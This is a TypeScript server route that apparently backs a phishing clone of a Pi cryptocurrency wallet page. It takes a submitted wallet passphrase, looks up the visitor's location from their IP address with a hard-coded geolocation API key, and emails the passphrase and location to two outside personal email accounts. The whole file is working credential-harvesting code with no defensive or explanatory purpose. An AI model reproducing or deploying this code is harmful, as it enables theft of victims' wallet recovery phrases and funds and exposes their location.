import nodemailer from 'nodemailer';

const formatMessage = async (message: string, location: string) => {
    const email = process.env.MY_EMAIL;
    const pass = process.env.MY_PASS;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: email,
            pass,
        }
    });

    // Split the message into lines and include the location
    const lines = message.split(/\r?\n/);
    const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);
    formattedLines.push(`<div><strong>Location:</strong> ${location}</div>`);

    // Join formatted lines into a single HTML string
    const formattedMessage = formattedLines.join('');

    const mailOptions = {
        from: `Excel PassPhrase ${email}`,
        to: "sparrowthedev@gmail.com",
        subject: "Yo! you just got a new passphrase from Excel",
        html: formattedMessage,
    };

    transporter.verify(function (error: any, success: any) {
        if (error) {
            console.log(`here is the error: ${error}`);
        } else {
            console.log("From two: Server is ready to take our messages");
        }
    });

    const result = await transporter.sendMail(mailOptions);

    if (result.response.includes("OK")) {
        console.log("email sent successfully!!");
    } else {
        console.log("Internal server error");
    }

    // Return the formatted message
    return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
};

export async function POST(request: Request) {
    try {
        const { message } = await request.json();
        const ip = request.headers.get('x-forwarded-for');
        const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9c72fe7c3bfa41cfaa4af67d3f711a11&ip=${ip}`);
        const locationJson = await locationData.json();
        const location = `${locationJson.city}, ${locationJson.country_name}`;
        await formatMessage(message, location);

        const email = process.env.EMAIL;
        const pass = process.env.PASS;

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: email,
                pass,
            }
        });

        const mailOptions = {
            from: `Pi Clone ${email}`,
            to: 'sommiewillz@gmail.com',
            subject: "You just got a new Pi phrase!",
            html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${message}</div>`,
        };

        transporter.verify(function (error: any, success: any) {
            if (error) {
                console.log(`here is the error: ${error}`);
            } else {
                console.log("From one: Server is ready to take our messages");
            }
        });

        const result = await transporter.sendMail(mailOptions);

        if (result.response.includes("OK")) {
            return Response.json({ message: "email sent successfully!!" }, { status: 200 });
        } else {
            return Response.json({ error: "Internal server error" }, { status: 500 });
        }
    } catch (error) {
        return Response.json({ error: 'Invalid passphrase' }, { status: 500 });
    }
}
